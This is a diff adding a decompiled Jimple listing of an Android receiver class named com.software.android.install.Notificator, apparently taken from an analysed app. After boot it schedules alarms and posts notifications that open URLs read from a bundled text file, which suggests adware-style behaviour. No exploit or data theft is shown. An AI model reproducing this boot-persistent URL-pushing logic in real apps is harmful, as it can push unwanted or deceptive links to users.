@@ -1,0 +1,282 @@
+public class com.software.android.install.Notificator extends android.content.BroadcastReceiver
+{
+    private static final java.lang.String KEY_NOTIFICATION_NUMBER;
+    private static final int MINUTES_UNTIL_NOTIFICATION;
+    private static final java.lang.String NOTIFICATION_ACT;
+    private android.content.SharedPreferences settings;
+
+    public void <init>()
+    {
+        com.software.android.install.Notificator r0;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>();
+
+        return;
+    }
+
+    private void decreaseNotificationNumber(android.content.SharedPreferences$Editor)
+    {
+        android.content.SharedPreferences$Editor $r1;
+        android.content.SharedPreferences $r2;
+        int $i0;
+        com.software.android.install.Notificator r0;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.SharedPreferences$Editor;
+
+        $r2 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+        $i0 = interfaceinvoke $r2.<android.content.SharedPreferences: int getInt(java.lang.String,int)>("KEY_NOTIFICATION_NUMBER", 0);
+
+        $i0 = $i0 + -1;
+
+        interfaceinvoke $r1.<android.content.SharedPreferences$Editor: android.content.SharedPreferences$Editor putInt(java.lang.String,int)>("KEY_NOTIFICATION_NUMBER", $i0);
+
+        interfaceinvoke $r1.<android.content.SharedPreferences$Editor: boolean commit()>();
+
+        return;
+    }
+
+    private void setInitialAlarm(android.content.Context)
+    {
+        android.content.Context $r1;
+        android.app.AlarmManager r4;
+        com.software.android.install.Notificator r0;
+        android.content.Intent r2;
+        java.lang.Object $r3;
+        long $l0;
+        android.app.PendingIntent $r5;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.Context;
+
+        r2 = new android.content.Intent;
+
+        specialinvoke r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/software/android/install/Notificator;");
+
+        $r3 = virtualinvoke $r1.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>("alarm");
+
+        r4 = (android.app.AlarmManager) $r3;
+
+        virtualinvoke r2.<android.content.Intent: android.content.Intent setAction(java.lang.String)>("NOTIFICATION_ACT");
+
+        $r5 = staticinvoke <android.app.PendingIntent: android.app.PendingIntent getBroadcast(android.content.Context,int,android.content.Intent,int)>($r1, 0, r2, 268435456);
+
+        $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>();
+
+        $l0 = $l0 + 300000000L;
+
+        virtualinvoke r4.<android.app.AlarmManager: void set(int,long,android.app.PendingIntent)>(0, $l0, $r5);
+
+        return;
+    }
+
+    private void showNotification(android.content.Context, int)
+    {
+        android.content.SharedPreferences$Editor $r12;
+        java.lang.Throwable $r13;
+        android.content.Context $r1;
+        android.net.Uri $r7;
+        android.content.Intent r2;
+        long $l1;
+        android.app.PendingIntent $r8;
+        int $i0;
+        java.lang.String $r4, $r5, $r6;
+        android.app.NotificationManager r10;
+        com.software.android.install.Notificator r0;
+        android.content.SharedPreferences $r11;
+        android.app.Notification r3;
+        java.lang.Object $r9;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.Context;
+
+        $i0 := @parameter1: int;
+
+        $l1 = staticinvoke <java.lang.System: long currentTimeMillis()>();
+
+     label01:
+        $r4 = staticinvoke <com.software.android.install.TextUtils: java.lang.String readLine(int,android.content.Context)>(8, $r1);
+
+        $r5 = staticinvoke <com.software.android.install.TextUtils: java.lang.String readLine(int,android.content.Context)>(7, $r1);
+
+        $r6 = staticinvoke <com.software.android.install.TextUtils: java.lang.String readLine(int,android.content.Context)>(6, $r1);
+
+     label02:
+        r2 = new android.content.Intent;
+
+     label03:
+        $r7 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r4);
+
+        specialinvoke r2.<android.content.Intent: void <init>(java.lang.String,android.net.Uri)>("android.intent.action.VIEW", $r7);
+
+        $r8 = staticinvoke <android.app.PendingIntent: android.app.PendingIntent getActivity(android.content.Context,int,android.content.Intent,int)>($r1, 0, r2, 268435456);
+
+        $r9 = virtualinvoke $r1.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>("notification");
+
+     label04:
+        r10 = (android.app.NotificationManager) $r9;
+
+        r3 = new android.app.Notification;
+
+     label05:
+        specialinvoke r3.<android.app.Notification: void <init>(int,java.lang.CharSequence,long)>(2130837510, $r6, $l1);
+
+        virtualinvoke r3.<android.app.Notification: void setLatestEventInfo(android.content.Context,java.lang.CharSequence,java.lang.CharSequence,android.app.PendingIntent)>($r1, $r6, $r5, $r8);
+
+     label06:
+        r3.<android.app.Notification: int flags> = 20;
+
+     label07:
+        virtualinvoke r10.<android.app.NotificationManager: void notify(int,android.app.Notification)>($i0, r3);
+
+     label08:
+        $r11 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+     label09:
+        $r12 = interfaceinvoke $r11.<android.content.SharedPreferences: android.content.SharedPreferences$Editor edit()>();
+
+        specialinvoke r0.<com.software.android.install.Notificator: void decreaseNotificationNumber(android.content.SharedPreferences$Editor)>($r12);
+
+     label10:
+        return;
+
+     label11:
+        $r13 := @caughtexception;
+
+        return;
+
+        catch java.io.IOException from label01 to label02 with label11;
+        catch java.io.IOException from label03 to label04 with label11;
+        catch java.io.IOException from label05 to label06 with label11;
+        catch java.io.IOException from label07 to label08 with label11;
+        catch java.io.IOException from label09 to label10 with label11;
+    }
+
+    public void initNotificationsNumberSettings(android.content.Context)
+    {
+        android.content.SharedPreferences$Editor $r3;
+        java.lang.Throwable $r5;
+        android.content.Context $r1;
+        com.software.android.install.Notificator r0;
+        android.content.SharedPreferences $r2;
+        int $i0;
+        java.lang.String $r4;
+        boolean $z0;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.Context;
+
+        $r2 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+        $z0 = interfaceinvoke $r2.<android.content.SharedPreferences: boolean contains(java.lang.String)>("KEY_NOTIFICATION_NUMBER");
+
+        if $z0 != 0 goto label4;
+
+        $r2 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+        interfaceinvoke $r2.<android.content.SharedPreferences: android.content.SharedPreferences$Editor edit()>();
+
+        $r2 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+        $r3 = interfaceinvoke $r2.<android.content.SharedPreferences: android.content.SharedPreferences$Editor edit()>();
+
+     label1:
+        $r4 = staticinvoke <com.software.android.install.TextUtils: java.lang.String readLine(int,android.content.Context)>(9, $r1);
+
+        $i0 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r4);
+
+        interfaceinvoke $r3.<android.content.SharedPreferences$Editor: android.content.SharedPreferences$Editor putInt(java.lang.String,int)>("KEY_NOTIFICATION_NUMBER", $i0);
+
+     label2:
+        interfaceinvoke $r3.<android.content.SharedPreferences$Editor: boolean commit()>();
+
+        specialinvoke r0.<com.software.android.install.Notificator: void setInitialAlarm(android.content.Context)>($r1);
+
+        return;
+
+     label3:
+        $r5 := @caughtexception;
+
+        goto label2;
+
+     label4:
+        return;
+
+        catch java.io.IOException from label1 to label2 with label3;
+    }
+
+    public void onReceive(android.content.Context, android.content.Intent)
+    {
+        android.content.Context $r1;
+        android.content.SharedPreferences $r4;
+        int $i0;
+        com.software.android.install.Notificator r0;
+        android.content.Intent $r2;
+        java.lang.String $r3;
+        boolean $z0;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.Context;
+
+        $r2 := @parameter1: android.content.Intent;
+
+        $r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>();
+
+        $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>("android.intent.action.BOOT_COMPLETED");
+
+        if $z0 != 0 goto label1;
+
+        $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>("NOTIFICATION_ACT");
+
+        if $z0 == 0 goto label2;
+
+     label1:
+        $r4 = virtualinvoke $r1.<android.content.Context: android.content.SharedPreferences getSharedPreferences(java.lang.String,int)>("PREFS", 0);
+
+        r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings> = $r4;
+
+        $r4 = r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings>;
+
+        $i0 = interfaceinvoke $r4.<android.content.SharedPreferences: int getInt(java.lang.String,int)>("KEY_NOTIFICATION_NUMBER", 0);
+
+        if $i0 <= 0 goto label2;
+
+        specialinvoke r0.<com.software.android.install.Notificator: void showNotification(android.content.Context,int)>($r1, $i0);
+
+     label2:
+        return;
+    }
+
+    public void setPrefs(android.content.SharedPreferences)
+    {
+        com.software.android.install.Notificator r0;
+        android.content.SharedPreferences $r1;
+
+        r0 := @this: com.software.android.install.Notificator;
+
+        $r1 := @parameter0: android.content.SharedPreferences;
+
+        r0.<com.software.android.install.Notificator: android.content.SharedPreferences settings> = $r1;
+
+        return;
+    }
+
+    public static void <clinit>()
+    {
+        <com.software.android.install.Notificator: java.lang.String NOTIFICATION_ACT> = "NOTIFICATION_ACT";
+
+        <com.software.android.install.Notificator: int MINUTES_UNTIL_NOTIFICATION> = 5000;
+
+        <com.software.android.install.Notificator: java.lang.String KEY_NOTIFICATION_NUMBER> = "KEY_NOTIFICATION_NUMBER";
+
+        return;
+    }
+}
